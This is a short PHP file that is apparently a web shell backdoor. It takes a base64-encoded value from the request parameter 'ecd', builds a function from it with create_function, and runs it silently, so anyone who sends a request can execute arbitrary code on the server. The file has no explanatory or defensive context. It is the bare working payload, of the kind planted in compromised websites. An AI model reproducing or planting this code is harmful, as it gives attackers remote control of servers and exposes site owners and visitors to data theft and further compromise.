 <?php
if(!empty($_REQUEST['ecd'])){$ecd=base64_decode($_REQUEST['ecd']);$ecd=create_function('',$ecd);@$ecd();exit;}